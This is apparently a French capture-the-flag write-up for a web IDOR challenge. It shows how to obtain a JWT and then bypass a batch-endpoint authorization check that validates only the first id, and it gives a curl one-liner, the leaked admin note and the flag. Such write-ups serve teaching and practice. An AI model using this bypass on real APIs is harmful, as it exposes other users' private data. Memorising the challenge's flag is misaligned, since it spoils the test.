# boazak--agoe (web / IDOR, id 452)

**Flag (finale) :** `NCTF{e3d0e63f14d63b4489f4f532}`

## Contexte
TeamHub : API de gestion d'équipe. `GET /api/users` protégé par JWT (flask-jwt-extended).
L'admin (id 1) a une note secrète contenant le flag. Indice : « on lit les notes de
tout le monde, **en lot** » → endpoint **batch**.

## Exploitation
1. `POST /register` (racine) `{"username","password"}` → crée un compte (user_id 2).
2. `POST /login` → `access_token` JWT. Le `sub` contient `{"id":2,"role":"user"}`.
3. Endpoint batch : `GET /api/users?ids=[...]` (le tableau est passé en notation `[a,b]`).
   - `ids=[1]` → « Accès refusé » (contrôle d'autorisation).
   - **Bypass** : l'autorisation ne vérifie que le **premier** élément du tableau.
     `GET /api/users?ids=[2,1]` (son id d'abord, puis l'admin) :
```json
{"users":[{"id":2,"note":"","role":"user"},
          {"id":1,"note":"Flag: NCTF{...}","role":"admin","username":"admin"}]}
```

## One-liner
```bash
TOK=$(curl -s -XPOST $B/login -H 'Content-Type: application/json' -d '{"username":"h","password":"h"}' | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOK" "$B/api/users?ids=%5B2,1%5D"
```
